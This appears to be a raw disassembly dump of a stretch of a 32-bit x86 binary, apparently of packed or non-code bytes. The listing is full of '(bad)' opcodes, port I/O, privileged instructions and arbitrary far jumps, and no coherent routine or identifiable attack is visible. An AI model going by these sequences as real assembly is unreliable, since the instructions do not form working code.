  40ddfa:	outs   dx,DWORD PTR ds:[esi]
  40ddfb:	shl    DWORD PTR [edx],cl
  40ddfd:	fisttp WORD PTR [esi]
  40ddff:	add    eax,0xa643b9fd
  40de04:	(bad)  
  40de05:	jl     0x40de75
  40de07:	jle    0x40de4f
  40de09:	pop    ds
  40de0a:	adc    DWORD PTR [edx-0xa544f96],eax
  40de10:	push   cs
  40de11:	fcom   st(1)
  40de13:	sub    edi,DWORD PTR [ecx+0x8920478]
  40de19:	pop    ss
  40de1a:	aas    
  40de1b:	in     al,0x3
  40de1d:	icebp  
  40de1e:	mov    ecx,0xf61db192
  40de23:	jl     0x40de22
  40de25:	xor    dh,dh
  40de27:	(bad)  
  40de28:	(bad)  ds:0xa8fbf788
  40de2e:	sub    al,dh
  40de30:	xchg   esi,eax
  40de31:	adc    bh,bh
  40de33:	xor    BYTE PTR [eax-0x183c2a1a],cl
  40de39:	push   ebx
  40de3a:	sbb    al,0xa3
  40de3c:	mov    cl,0xfc
  40de3e:	dec    ebx
  40de3f:	adc    BYTE PTR [esi],ch
  40de41:	mov    ebx,0xd1d4c3cd
  40de46:	add    ebp,DWORD PTR [ebp-0x39]
  40de49:	pop    edx
  40de4a:	adc    al,BYTE PTR [edx-0x7e]
  40de4d:	xchg   ah,bl
  40de4f:	ins    DWORD PTR es:[edi],dx
  40de50:	(bad)  
  40de51:	push   0x4e
  40de53:	pop    ebx
  40de54:	ficomp DWORD PTR [edi+0xaa1f1e2]
  40de5a:	push   ebx
  40de5b:	xor    DWORD PTR [eax],ecx
  40de5d:	inc    ebp
  40de5e:	jno    0x40de56
  40de60:	out    0x97,eax
  40de62:	sub    eax,0x49967b22
  40de67:	dec    ah
  40de69:	jmp    0xf8ea59b9
  40de6e:	out    dx,al
  40de6f:	ret    0x7687
  40de72:	sbb    DWORD PTR [edi],0xe1b6d6d3
  40de78:	jne    0x40de76
  40de7a:	int3   
  40de7b:	xchg   ebx,eax
  40de7c:	fs mov edi,0x57878e9b
  40de82:	pusha  
  40de83:	or     ch,BYTE PTR [edi+0x18666602]
  40de89:	mov    esp,0x71d1cf17
  40de8e:	scas   al,BYTE PTR es:[edi]
  40de8f:	dec    esi
  40de90:	dec    ah
  40de92:	jle    0x40dea9
  40de94:	fiadd  DWORD PTR [esi+esi*2+0x41a43a34]
  40de9b:	stos   DWORD PTR es:[edi],eax
  40de9c:	xor    bl,BYTE PTR [edi+0x68]
  40de9f:	shl    eax,cl
  40dea1:	lods   al,BYTE PTR ds:[esi]
  40dea2:	mov    esp,DWORD PTR [edi+0x1e]
  40dea5:	ins    BYTE PTR es:[edi],dx
  40dea6:	add    al,cl
  40dea8:	out    dx,al
  40dea9:	outs   dx,DWORD PTR ds:[esi]
  40deaa:	mov    cl,0xff
  40deac:	inc    esi
  40dead:	cmc    
  40deae:	xlat   BYTE PTR ds:[ebx]
  40deaf:	iret   
  40deb0:	loop   0x40de84
  40deb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deb3:	pushf  
  40deb4:	xchg   ebp,eax
  40deb5:	sbb    al,0x23
  40deb7:	or     edi,ecx
  40deb9:	jne    0x40de51
  40debb:	rol    DWORD PTR [esi-0x25d70c37],0x7
  40dec2:	fldcw  WORD PTR [ecx-0x1ac44280]
  40dec8:	sub    dh,BYTE PTR [edi+0x3b93e466]
  40dece:	adc    edi,DWORD PTR [eax+0x1ab44130]
  40ded4:	jl     0x40dea0
  40ded6:	mov    ebp,DWORD PTR [ecx]
  40ded8:	mov    dh,BYTE PTR [ebx]
  40deda:	sbb    bh,bl
  40dedc:	fnsave ds:[edi+0x33]
  40dee0:	mov    BYTE PTR [edi+0x79],dl
  40dee3:	int3   
  40dee4:	lods   al,BYTE PTR ds:[esi]
  40dee5:	push   ds
  40dee6:	ja     0x40ded5
  40dee8:	inc    ebp
  40dee9:	sub    eax,0xf5478dda
  40deee:	(bad)  
  40deef:	cwde   
  40def0:	bound  ecx,QWORD PTR cs:[ebx+eiz*1]
  40def4:	stc    
  40def5:	in     eax,0x1
  40def7:	mov    ds:0x79e80c0e,al
  40defc:	loopne 0x40df58
  40defe:	pushf  
  40deff:	mov    ah,0x50
  40df01:	loope  0x40df48
  40df03:	sub    ebx,esp
  40df05:	or     ecx,ecx
  40df07:	xor    BYTE PTR [esi-0x4922c381],dl
  40df0d:	retf   
  40df0e:	cmp    BYTE PTR [ebx+0x11],cl
  40df11:	add    DWORD PTR [ebx-0x21],ecx
  40df14:	scas   eax,DWORD PTR es:[edi]
  40df15:	mov    ecx,0xc097a9a2
  40df1a:	mov    esp,0x1733e4d6
  40df1f:	pop    es
  40df20:	sub    eax,0x5cbae58e
  40df25:	push   eax
  40df26:	jle    0x40df51
  40df28:	jecxz  0x40ded1
  40df2a:	(bad)  
  40df2b:	and    dl,BYTE PTR [edi+ecx*1]
  40df2e:	xor    al,0x5a
  40df30:	and    BYTE PTR [edi+ebx*8+0x32],bl
  40df34:	(bad)  
  40df35:	and    ebx,DWORD PTR [edi+ebx*1+0x2b11052f]
  40df3c:	inc    ebp
  40df3d:	sub    edi,DWORD PTR [ebx]
  40df3f:	cmp    eax,0xa484b827
  40df44:	adc    al,0x83
  40df46:	cs add al,0x41
  40df49:	aaa    
  40df4a:	stos   BYTE PTR es:[edi],al
  40df4b:	ret    0x4577
  40df4e:	cmp    edi,DWORD PTR [ebx+0x4c]
  40df51:	pushf  
  40df52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df53:	mov    al,ds:0xf6689dae
  40df58:	pop    es
  40df59:	sar    DWORD PTR [edi],0x46
  40df5c:	adc    eax,0x5097d05
  40df61:	and    eax,0xf10a6043
  40df66:	xchg   ebp,eax
  40df67:	in     al,0x4d
  40df69:	bound  ebp,QWORD PTR [eax+0x1d9213ed]
  40df6f:	mov    ah,BYTE PTR [ecx]
  40df71:	cmp    al,0x17
  40df73:	ds push esi
  40df75:	xchg   ecx,eax
  40df76:	xor    DWORD PTR [esi],ebx
  40df78:	adc    al,0x9e
  40df7a:	mov    eax,ds:0xee9b7271
  40df7f:	add    ebx,esi
  40df81:	loope  0x40dff2
  40df83:	xor    esp,DWORD PTR ds:0xddc57d5b
  40df89:	hlt    
  40df8a:	mov    ebp,0xf392f678
  40df8f:	lea    ecx,[edx-0x3b92419f]
  40df95:	xchg   edx,eax
  40df96:	test   DWORD PTR [ecx+0x7e],edi
  40df99:	out    0xb8,eax
  40df9b:	test   BYTE PTR ds:0xee9aafe7,bl
  40dfa1:	fcmovnb st,st(3)
  40dfa3:	test   eax,0x1568c7da
  40dfa8:	repz (bad) 
  40dfaa:	push   edi
  40dfab:	hlt    
  40dfac:	xor    BYTE PTR [ecx],al
  40dfae:	mov    ah,0x6
  40dfb0:	pop    es
  40dfb1:	jbe    0x40df98
  40dfb3:	sub    DWORD PTR [edi-0x15],0xffffff88
  40dfb7:	fstp   QWORD PTR [ebp+edx*2+0x6aaa10bf]
  40dfbe:	push   0x5d552863
  40dfc3:	fsub   DWORD PTR [ebp-0x121df4b3]
  40dfc9:	mov    ecx,0x2fa1a574
  40dfce:	aam    0xf5
  40dfd0:	clc    
  40dfd1:	sbb    BYTE PTR [ecx],bh
  40dfd3:	push   es
  40dfd4:	xchg   edx,eax
  40dfd5:	imul   ebx,DWORD PTR [esi+edx*8+0x2b185ac9],0x2d71da84
  40dfe0:	or     esp,DWORD PTR [ebp-0x3ea59d61]
  40dfe6:	cdq    
  40dfe7:	in     al,0x29
  40dfe9:	mov    ch,BYTE PTR [edi-0x6f739647]
  40dfef:	lahf   
  40dff0:	leave  
  40dff1:	pop    edx
  40dff2:	(bad)  
  40dff3:	data16 jns 0x40dffc
  40dff6:	es repz mov ebx,es
  40dffa:	xchg   edx,eax
  40dffb:	aaa    
  40dffc:	icebp  
  40dffd:	and    esp,ebp
  40dfff:	cmp    al,0x9a
  40e001:	jg     0x40e00a
  40e003:	mov    ch,BYTE PTR [edx-0x4b]
  40e006:	js     0x40e026
  40e008:	jno    0x40dfa9
  40e00a:	mov    ds:0x152d80d7,al
  40e00f:	mov    bh,0xac
  40e011:	sub    eax,0x751e1186
  40e016:	hlt    
  40e017:	gs ja  0x40e05b
  40e01a:	add    esp,DWORD PTR [edx+0x78]
  40e01d:	dec    esi
  40e01e:	xchg   esi,eax
  40e01f:	(bad)  
  40e020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e022:	mov    edx,0x4f72a21e
  40e027:	jmp    0x40e026
  40e029:	lahf   
  40e02a:	push   ebx
  40e02b:	retf   
  40e02c:	dec    ebx
  40e02d:	ror    DWORD PTR [ebx],cl
  40e02f:	sbb    al,0xe2
  40e031:	adc    eax,0x86b77393
  40e036:	scas   eax,DWORD PTR es:[edi]
  40e037:	mov    BYTE PTR [ebp-0x756b5091],al
  40e03d:	push   ebx
  40e03e:	in     al,0x85
  40e040:	jae    0x40e073
  40e042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e043:	mov    dh,0xe6
  40e045:	jns    0x40dfe4
  40e047:	neg    DWORD PTR ds:0x9520887f
  40e04d:	or     edi,ecx
  40e04f:	mov    ch,BYTE PTR fs:[esi-0x16]
  40e053:	cdq    
  40e054:	outs   dx,DWORD PTR ds:[esi]
  40e055:	aam    0xb7
  40e057:	add    ebp,DWORD PTR [ecx+0x1e]
  40e05a:	xor    BYTE PTR [esi],ch
  40e05c:	aam    0xc6
  40e05e:	retf   
  40e05f:	xchg   ebx,eax
  40e060:	and    bh,dl
  40e062:	into   
  40e063:	sbb    ah,ah
  40e065:	inc    eax
  40e066:	fcmovnbe st,st(4)
  40e068:	mov    bh,0x8c
  40e06a:	lods   eax,DWORD PTR ds:[esi]
  40e06b:	fnsave [esp+ebx*2+0x4c]
  40e06f:	sbb    edx,DWORD PTR [eax+0x1a]
  40e072:	or     bl,bh
  40e074:	dec    ebp
  40e075:	sub    eax,0x5c5c4b5a
  40e07a:	xor    BYTE PTR [esi-0xbf276ca],0x1d
  40e081:	inc    ebx
  40e082:	pop    ebx
  40e083:	mov    eax,0xa537ac5a
  40e088:	and    dl,BYTE PTR [edi+0x2]
  40e08b:	cli    
  40e08c:	adc    esi,DWORD PTR [ecx]
  40e08e:	jno    0x40e042
  40e090:	xor    ch,dh
  40e092:	mov    bh,0x7
  40e094:	inc    esp
  40e095:	and    ch,ch
  40e097:	push   0x6ed3bf02
  40e09c:	cwde   
  40e09d:	add    BYTE PTR [ecx+0x71bde52a],dl
  40e0a3:	popa   
  40e0a4:	mov    dh,0xaf
  40e0a6:	adc    edi,ebx
  40e0a8:	adc    al,0xb0
  40e0aa:	xchg   ebx,eax
  40e0ab:	jo     0x40e066
  40e0ad:	lds    ebp,FWORD PTR [esi+edi*8+0x45]
  40e0b1:	or     eax,0xf8f9dbb0
  40e0b6:	pop    ebx
  40e0b7:	jno    0x40e0c8
  40e0b9:	mov    bl,0x43
  40e0bb:	(bad)  
  40e0bc:	mov    dh,0x7e
  40e0be:	(bad)  
  40e0bf:	loope  0x40e0fc
  40e0c1:	mov    esp,0x8e1c0d75
  40e0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c7:	repz dec ecx
  40e0c9:	mov    ds:0x6a6db5f5,al
  40e0ce:	aaa    
  40e0cf:	xor    al,0xfc
  40e0d1:	xor    bl,al
  40e0d3:	add    eax,0x9ffa359
  40e0d8:	add    al,0xaf
  40e0da:	mov    ds:0x23a28301,al
  40e0df:	sbb    ah,BYTE PTR [edx]
  40e0e1:	jp     0x40e08e
  40e0e3:	jmp    0x69f6:0xaf553075
  40e0ea:	push   esi
  40e0eb:	into   
  40e0ec:	jns    0x40e11c
  40e0ee:	sbb    edi,ecx
  40e0f0:	or     al,0x77
  40e0f2:	retf   0x4fc1
  40e0f5:	inc    BYTE PTR [eax]
  40e0f7:	and    DWORD PTR [ebp+0x21],edx
  40e0fa:	scas   al,BYTE PTR es:[edi]
  40e0fb:	pop    esi
  40e0fc:	cmp    dl,BYTE PTR ds:0xd75633fa
  40e102:	inc    edx
  40e103:	lock sub DWORD PTR [edi-0xd92c1d7],0x9ee1d25f
  40e10e:	ins    DWORD PTR es:[edi],dx
  40e10f:	mov    dl,0xbb
  40e111:	lds    edi,FWORD PTR [ebx]
  40e113:	sbb    ch,cl
  40e115:	adc    ebp,DWORD PTR [ecx*1-0x5593ce84]
  40e11c:	(bad)  
  40e11d:	fcomp  DWORD PTR [eax+0x79d3934f]
  40e123:	pop    ebx
  40e124:	imul   ebp,edi,0xb
  40e127:	test   eax,0xa7c52762
  40e12c:	jmp    0xb694fe5c
  40e131:	loope  0x40e124
  40e133:	in     al,dx
  40e134:	inc    ebp
  40e135:	rol    al,cl
  40e137:	ret    0xbea2
  40e13a:	hlt    
  40e13b:	fld    QWORD PTR [edx+0x13]
  40e13e:	call   0x3b1f:0xcaf12e95
  40e145:	rol    cl,0x2a
  40e148:	mov    ch,0xb4
  40e14a:	in     al,0x71
  40e14c:	push   ds
  40e14d:	and    BYTE PTR [eax+0x78049767],ch
  40e153:	mov    edi,0x2fac193f
  40e158:	jne    0x40e12b
  40e15a:	add    esi,DWORD PTR [edi]
  40e15c:	iret   
  40e15d:	jbe    0x40e1be
  40e15f:	ds pusha 
  40e161:	hlt    
  40e162:	add    esi,ebx
  40e164:	mov    esp,0xff383421
  40e169:	xchg   ebx,eax
  40e16a:	mov    DWORD PTR [edi+eax*4],eax
  40e16d:	mov    ch,BYTE PTR [ecx+eax*4-0x7cec7c52]
  40e174:	add    al,0xe0
  40e176:	dec    ebp
  40e177:	ss (bad) 
  40e179:	jl     0x40e13c
  40e17b:	adc    al,0x87
  40e17d:	ja     0x40e1c7
  40e17f:	pushf  
  40e180:	shr    eax,0xba
  40e183:	shl    DWORD PTR [edx+0x52],1
  40e186:	xor    edx,DWORD PTR [edx+0x37]
  40e189:	lods   al,BYTE PTR ds:[esi]
  40e18a:	jp     0x40e196
  40e18c:	aas    
  40e18d:	sbb    DWORD PTR [ecx],ebp
  40e18f:	rcr    DWORD PTR [edi-0x6a],1
  40e192:	ins    DWORD PTR es:[edi],dx
  40e193:	loopne 0x40e122
  40e195:	rcl    BYTE PTR [ebx],0x6a
  40e198:	mov    al,ds:0x5a15cf61
  40e19d:	ins    BYTE PTR es:[edi],dx
  40e19e:	jno    0x40e20e
  40e1a0:	and    ah,0x9d
  40e1a3:	xchg   ebp,eax
  40e1a4:	stc    
  40e1a5:	stos   BYTE PTR es:[edi],al
  40e1a6:	jo     0x40e186
  40e1a8:	out    dx,eax
  40e1a9:	dec    edi
  40e1aa:	mov    eax,0x5d629cfb
  40e1af:	cmp    DWORD PTR [eax],ebp
  40e1b1:	inc    ebx
  40e1b2:	arpl   WORD PTR [ecx],ax
  40e1b4:	sahf   
  40e1b5:	clc    
  40e1b6:	or     eax,0x749fe010
  40e1bb:	xchg   ecx,eax
  40e1bc:	adc    DWORD PTR [ecx],ebx
  40e1be:	xchg   esp,eax
  40e1bf:	int    0x92
  40e1c1:	hlt    
  40e1c2:	aaa    
  40e1c3:	es push ecx
  40e1c5:	js     0x40e167
  40e1c7:	iretw  
  40e1c9:	outs   dx,DWORD PTR ds:[esi]
  40e1ca:	sub    eax,0x600cd8f5
  40e1cf:	fiadd  WORD PTR [edx-0xd]
  40e1d2:	push   cs
  40e1d3:	jae    0x40e1bb
  40e1d5:	outs   dx,BYTE PTR ss:[esi]
  40e1d7:	sbb    esi,ecx
  40e1d9:	bound  edx,QWORD PTR [eax+ecx*4-0x1f]
  40e1dd:	mov    dl,0x4d
  40e1df:	inc    eax
  40e1e0:	pop    ss
  40e1e1:	js     0x40e168
  40e1e3:	jae    0x40e1f4
  40e1e5:	and    al,0x1e
  40e1e7:	imul   ecx,DWORD PTR [ebx-0x2bf66f8d],0xfffffff4
  40e1ee:	pop    edx
  40e1ef:	xchg   edx,eax
  40e1f0:	mov    ds:0x3f58c33f,al
  40e1f5:	mov    al,ds:0x28e476f4
  40e1fa:	inc    eax
  40e1fb:	add    dh,ch
  40e1fd:	push   es
  40e1fe:	and    ch,BYTE PTR [ebx-0x7a]
  40e201:	inc    ebx
  40e202:	xlat   BYTE PTR ds:[ebx]
  40e203:	bnd jg 0x40e1ad
  40e206:	(bad)  
  40e207:	retf   0x68c8
  40e20a:	jns    0x40e258
  40e20c:	imul   edx,DWORD PTR [edi+0x2d],0xcbe42436
  40e213:	int    0xec
  40e215:	cld    
  40e216:	fldcw  WORD PTR [edi-0x3]
  40e219:	sub    ecx,DWORD PTR [ecx-0xf]
  40e21c:	adc    DWORD PTR [ebp-0x6d644b07],esp
  40e222:	jbe    0x40e26a
  40e224:	outs   dx,DWORD PTR ds:[esi]
  40e225:	cld    
  40e226:	push   ds
  40e227:	int3   
  40e228:	xchg   edx,eax
  40e229:	pop    esi
  40e22a:	mov    bl,0x91
  40e22c:	push   edi
  40e22d:	xchg   esp,eax
  40e22e:	inc    ebx
  40e22f:	repz in eax,dx
  40e231:	fnstenv [esi-0x12ebb29]
  40e237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e238:	leave  
  40e239:	cs sti 
  40e23b:	mov    ebx,0x77371651
  40e240:	in     eax,dx
  40e241:	jae    0x40e254
  40e243:	repnz rol BYTE PTR [ecx],0xa9
  40e247:	ficom  WORD PTR [ebx+0x8e29ca1]
  40e24d:	aas    
  40e24e:	dec    ebx
  40e24f:	xor    ecx,DWORD PTR [ecx+0xff7d76c]
  40e255:	sub    cl,0x24
  40e258:	mov    ch,0xce
  40e25a:	scas   eax,DWORD PTR es:[edi]
  40e25b:	lods   al,BYTE PTR ds:[esi]
  40e25c:	sbb    BYTE PTR [ebx-0x4f],ch
  40e25f:	std    
  40e260:	leave  
  40e261:	sti    
  40e262:	rcr    BYTE PTR ds:0xf9118ebd,cl
  40e268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e269:	in     eax,dx
  40e26a:	lahf   
  40e26b:	in     al,dx
  40e26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e26d:	cmc    
  40e26e:	jb     0x40e216
  40e270:	mov    DWORD PTR [edx+0x3d],edi
  40e273:	ret    0x14e0
  40e276:	ret    0x68b5
  40e279:	repz xor BYTE PTR [ebx+0x41],ah
  40e27d:	jbe    0x40e211
  40e27f:	outs   dx,DWORD PTR ds:[esi]
  40e280:	add    eax,0xed914be9
  40e285:	dec    edx
  40e286:	dec    edi
  40e287:	fdiv   QWORD PTR [eax-0x629c0031]
  40e28d:	mov    edi,0x4b9dbed2
  40e292:	test   ecx,edi
  40e294:	mov    cl,0x69
  40e296:	push   0xd6e711c7
  40e29b:	xchg   edx,eax
  40e29c:	pavgw  mm1,mm7
  40e29f:	cs nop
  40e2a1:	outs   dx,DWORD PTR ds:[esi]
  40e2a2:	rcl    BYTE PTR [ebp+0x29],0x53
  40e2a6:	dec    esi
  40e2a7:	dec    ecx
  40e2a8:	mov    BYTE PTR [ebx],bh
  40e2aa:	mov    ds,WORD PTR [edi-0xa740306]
  40e2b0:	or     bh,BYTE PTR [eax]
  40e2b2:	call   0xdc4c:0x9ff005b9
  40e2b9:	mov    esp,0x2d72b90a
  40e2be:	mov    al,ds:0xa8b4e729
  40e2c3:	mov    esp,0xb44aebc
  40e2c8:	mov    DWORD PTR [edi+edx*2+0x58],ecx
  40e2cc:	loope  0x40e2da
  40e2ce:	mov    esp,0x610bd83d
  40e2d3:	loopne 0x40e302
  40e2d5:	into   
  40e2d6:	xchg   ecx,ebx
  40e2d8:	jbe    0x40e317
  40e2da:	test   al,0xce
  40e2dc:	call   0xc9ee:0x4b24291c
  40e2e3:	iret   
  40e2e4:	push   ds
  40e2e5:	idiv   ch
  40e2e7:	rcl    BYTE PTR [esi],1
  40e2e9:	sbb    al,BYTE PTR [ebp-0x2a]
  40e2ec:	mov    ebp,0x9af1e47e
  40e2f1:	test   al,0xf
  40e2f3:	loop   0x40e356
  40e2f5:	stos   DWORD PTR es:[edi],eax
  40e2f6:	mov    bh,0x3d
  40e2f8:	sub    DWORD PTR [edi-0x884bb9d],eax
  40e2fe:	and    al,0xe5
  40e300:	mov    ah,0x2d
  40e302:	xchg   ebx,eax
  40e303:	push   0xf9b48fa0
  40e308:	lahf   
  40e309:	push   ebp
  40e30a:	lods   eax,DWORD PTR ds:[esi]
  40e30b:	lods   al,BYTE PTR ds:[esi]
  40e30c:	jnp    0x40e356
  40e30e:	outs   dx,DWORD PTR ds:[esi]
  40e30f:	lahf   
  40e310:	ins    BYTE PTR es:[edi],dx
  40e311:	sbb    dh,cl
  40e313:	popa   
  40e314:	sbb    BYTE PTR [esi+0x1b],0x4f
  40e318:	ins    BYTE PTR es:[edi],dx
  40e319:	pop    eax
  40e31a:	popf   
  40e31b:	mov    al,ds:0xf78ec3b
  40e320:	push   ecx
  40e321:	outs   dx,DWORD PTR ds:[esi]
  40e322:	pushf  
  40e323:	loope  0x40e32f
  40e325:	jb     0x40e34c
  40e327:	push   ecx
  40e328:	(bad)  
  40e329:	lods   al,BYTE PTR ds:[esi]
  40e32a:	fsub   DWORD PTR [ecx-0x8]
  40e32d:	jecxz  0x40e3a0
  40e32f:	xchg   edx,eax
  40e330:	inc    ebx
  40e331:	push   ds
  40e332:	shr    BYTE PTR [ebx-0x5e702df4],cl
  40e338:	and    bl,BYTE PTR [eax+0x6ab8cf9]
  40e33e:	test   eax,0xbfb4b929
  40e343:	jg     0x40e2ce
  40e345:	(bad)  
  40e346:	(bad)  
  40e348:	aad    0xc8
  40e34a:	mov    eax,0xb29800ff
  40e34f:	pop    edi
  40e350:	xor    DWORD PTR [ecx],esi
  40e352:	into   
  40e353:	cwde   
  40e354:	push   ecx
  40e355:	mov    bl,0x1d
  40e357:	aad    0x34
  40e359:	mov    al,ds:0x701cef8c
  40e35e:	das    
  40e35f:	out    dx,eax
  40e360:	mov    DWORD PTR cs:[edx+0x9],esp
  40e364:	inc    edx
  40e365:	ret    0x88e6
  40e368:	loopne 0x40e32d
  40e36a:	jecxz  0x40e3ea
  40e36c:	aam    0xf3
  40e36e:	icebp  
  40e36f:	and    esp,esi
  40e371:	xchg   ebp,eax
  40e372:	jmp    FWORD PTR [eax]
  40e374:	adc    al,0x3b
  40e376:	mov    ah,0xdb
  40e378:	xchg   ebp,eax
  40e379:	test   eax,0x405bc2b0
  40e37e:	mov    ebx,es
  40e380:	push   0xacd902e2
  40e385:	xlat   BYTE PTR ds:[ebx]
  40e386:	lea    esi,[eax]
  40e388:	je     0x40e347
  40e38a:	mov    edi,0x69d8f129
  40e38f:	sbb    BYTE PTR [ebx-0x6e],0xa5
  40e393:	das    
  40e394:	ret    
  40e395:	cmc    
  40e396:	mov    ecx,0x68c75f27
  40e39b:	pop    ecx
  40e39c:	jge    0x40e361
  40e39e:	pop    eax
  40e39f:	sti    
  40e3a0:	mov    dh,0xdf
  40e3a2:	or     bh,dl
  40e3a4:	sub    eax,0x4838ea99
  40e3a9:	add    BYTE PTR [edi],bl
  40e3ab:	inc    ebx
  40e3ac:	fwait
  40e3ad:	xchg   edi,ecx
  40e3af:	imul   esp,DWORD PTR [ebp-0x72a92222],0x771a9c2e
  40e3b9:	std    
  40e3ba:	cmp    BYTE PTR [ebp-0x25876a42],dh
  40e3c0:	xchg   BYTE PTR [edx],ah
  40e3c2:	sbb    eax,0x48d3cd94
  40e3c7:	dec    esp
  40e3c8:	mov    ecx,0x2f7f1228
  40e3cd:	and    dl,BYTE PTR [esp+edx*2-0x74]
  40e3d1:	(bad)  
  40e3d2:	js     0x40e443
  40e3d4:	rcr    DWORD PTR [eax+0x7efa0b8c],1
  40e3da:	not    DWORD PTR [ebp+0x9]
  40e3dd:	lods   al,BYTE PTR ds:[esi]
  40e3de:	gs popf 
  40e3e0:	iret   
  40e3e1:	test   eax,0x81cfe2d8
  40e3e6:	mov    cl,0xa7
  40e3e8:	push   ebp
  40e3e9:	pop    ebx
  40e3ea:	in     al,dx
  40e3eb:	sub    ah,BYTE PTR [ebx]
  40e3ed:	scas   eax,DWORD PTR es:[edi]
  40e3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3ef:	jne    0x40e3e9
  40e3f1:	lahf   
  40e3f2:	push   esi
  40e3f3:	in     al,dx
  40e3f4:	sub    al,0xbd
  40e3f6:	cmp    DWORD PTR [eax],esp
  40e3f8:	inc    eax
  40e3f9:	push   cs
  40e3fa:	ss in  al,0xa
  40e3fd:	jmp    DWORD PTR [ebp+0x59]
  40e400:	mov    eax,ds:0xe00f9532
  40e405:	aam    0xb
  40e407:	daa    
  40e408:	cmp    al,0xe5
  40e40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e40b:	out    dx,eax
  40e40c:	cs xchg ebx,eax
  40e40e:	sub    al,0xe8
  40e410:	lds    ebp,FWORD PTR [ecx+0x259792c9]
  40e416:	push   edx
  40e417:	bnd jb 0x40e3b1
  40e41a:	and    bl,BYTE PTR [ebp+0x29d839b]
  40e420:	dec    eax
  40e421:	in     eax,dx
  40e422:	hlt    
  40e423:	jbe    0x40e49e
  40e425:	mov    ecx,0x34ed1804
  40e42a:	add    BYTE PTR [ebp+edx*4-0x7c],cl
  40e42e:	cdq    
  40e42f:	stos   DWORD PTR es:[edi],eax
  40e430:	sbb    eax,0xfeae4e36
  40e435:	mov    ah,0xa7
  40e437:	xlat   BYTE PTR ds:[ebx]
  40e438:	sub    dh,BYTE PTR [ecx-0x3]
  40e43b:	jge    0x40e424
  40e43d:	imul   BYTE PTR [ebx-0x4d334cd7]
  40e443:	or     DWORD PTR [ecx-0x1],esp
  40e446:	sub    ecx,DWORD PTR [ebp-0x7d0d0d3]
  40e44c:	shr    ebp,1
  40e44e:	mov    ds:0x7b27253a,eax
  40e453:	dec    ebp
  40e454:	adc    ah,BYTE PTR [edi+0x4c515992]
  40e45a:	jge    0x40e4b9
  40e45c:	pop    ebp
  40e45d:	sbb    BYTE PTR [ecx+0x2],dl
  40e460:	jno    0x40e443
  40e462:	ret    
  40e463:	pop    ebp
  40e464:	mov    edi,0x31efd94d
  40e469:	mov    ds:0x53ca153a,al
  40e46e:	imul   ecx,ebp,0x8
  40e471:	mov    edi,0xdd70ec42
  40e476:	sbb    ebx,DWORD PTR [edx+0x4]
  40e479:	cmp    eax,ecx
  40e47b:	mov    dl,0xdd
  40e47d:	lahf   
  40e47e:	push   ebx
  40e47f:	lds    ebx,FWORD PTR [ebx+0x7c]
  40e482:	ins    BYTE PTR es:[edi],dx
  40e483:	adc    BYTE PTR [esi+0x1824c76d],dl
  40e489:	out    dx,eax
  40e48a:	add    al,0xd1
  40e48c:	jne    0x40e466
  40e48e:	cs xchg ecx,eax
  40e490:	retf   0x954f
  40e493:	popa   
  40e494:	mov    ds:0x6cd7abb7,al
  40e499:	mov    al,0x7b
  40e49b:	dec    ebx
  40e49c:	cmc    
  40e49d:	dec    esp
  40e49e:	pop    edx
  40e49f:	adc    cl,bl
  40e4a1:	mov    eax,?
  40e4a3:	add    BYTE PTR [edx],dh
  40e4a5:	aad    0x99
  40e4a7:	cmp    ch,dh
  40e4a9:	jp     0x40e4ee
  40e4ab:	pushf  
  40e4ac:	xlat   BYTE PTR ds:[ebx]
  40e4ad:	jecxz  0x40e491
  40e4af:	sbb    BYTE PTR [ecx+0x68db34a2],bh
  40e4b5:	or     eax,0x85ca7418
  40e4ba:	ret    
  40e4bb:	sub    ecx,ebp
  40e4bd:	cli    
  40e4be:	jns    0x40e4cd
  40e4c0:	out    0x1e,eax
  40e4c2:	mov    edi,ebx
  40e4c4:	inc    ebx
  40e4c5:	cvttps2pi mm0,xmm2
  40e4c8:	and    al,0x90
  40e4ca:	pop    edx
  40e4cb:	mov    bl,0x6b
  40e4cd:	loop   0x40e49d
  40e4cf:	sub    ch,cl
  40e4d1:	lea    esi,[edx+eiz*1+0x37]
  40e4d5:	xor    esi,DWORD PTR [edx]
  40e4d7:	pop    es
  40e4d8:	popa   
  40e4d9:	ins    BYTE PTR es:[edi],dx
  40e4da:	(bad)  
  40e4db:	call   0xe3a1f095
  40e4e0:	lods   al,BYTE PTR ds:[esi]
  40e4e1:	adc    eax,0xe4c98755
  40e4e6:	add    ebx,ebp
  40e4e8:	in     eax,dx
  40e4e9:	cmp    dh,BYTE PTR [ebp-0x3ed70431]
  40e4ef:	pop    ebx
  40e4f0:	add    ah,0xb9
  40e4f3:	or     al,0x9
  40e4f5:	ja     0x40e50d
  40e4f7:	outs   dx,BYTE PTR ds:[esi]
  40e4f8:	adc    eax,0xec32fa78
  40e4fd:	ins    DWORD PTR es:[edi],dx
  40e4fe:	sub    al,BYTE PTR [esi+0x2e]
  40e501:	or     DWORD PTR [ecx],ebp
  40e503:	loop   0x40e4ef
  40e505:	and    al,0x59
  40e507:	sbb    al,BYTE PTR [edx-0x443d5831]
  40e50d:	mov    ebp,0x59342237
  40e512:	(bad)  
  40e513:	mov    ebp,0xd46feef3
  40e518:	mov    dl,0xc8
  40e51a:	aaa    
  40e51b:	imul   edx,DWORD PTR [eax],0x27
  40e51e:	and    DWORD PTR [ecx+0x9764e5e],edi
  40e524:	out    0x59,al
  40e526:	loopne 0x40e51a
  40e528:	es mov edx,0x74849fb5
  40e52e:	ror    al,0x39
  40e531:	test   eax,0x10a57d10
  40e536:	aas    
  40e537:	pop    esi
  40e538:	sbb    BYTE PTR fs:[edx],bh
  40e53b:	ins    BYTE PTR es:[edi],dx
  40e53c:	or     DWORD PTR [esi+ebp*8+0xbfa6bad],0xffffffed
  40e544:	js     0x40e542
  40e546:	push   ebp
  40e547:	idiv   DWORD PTR [ebx+eax*1]
  40e54a:	jne    0x40e5b2
  40e54c:	inc    esi
  40e54d:	push   ebx
